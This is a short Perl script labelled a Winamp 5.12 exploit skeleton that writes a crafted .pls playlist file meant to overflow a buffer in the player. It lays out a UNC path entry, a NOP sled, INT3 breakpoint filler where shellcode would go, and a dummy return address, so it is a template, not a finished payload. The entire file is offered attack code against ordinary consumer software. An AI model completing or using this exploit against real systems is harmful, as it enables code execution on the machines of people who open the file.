#!/usr/bin/perl 
#
# ============================
#          Winamp 5.12      
#       Exploit Skeleton                  
# ============================


$start= "[playlist]\r\nFile1=\\\\";

$jmp="\x41\x41\x41\x41";

$stage1="\x83\x83\x83\x83\x83\x83\x83\x83"."\x90\x90\x90\x90";

$stage2="\xcc" x 166;

$stage3="\x90" x 856;

$end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberofEntries=1\r\nVersion=2\r\n";

open (MYFILE, '>>exploit.pls');

print MYFILE $start;          
print MYFILE $stage3;            
print MYFILE $stage2;      
print MYFILE $jmp;                
print MYFILE $stage1;
print MYFILE $end;
close (MYFILE);
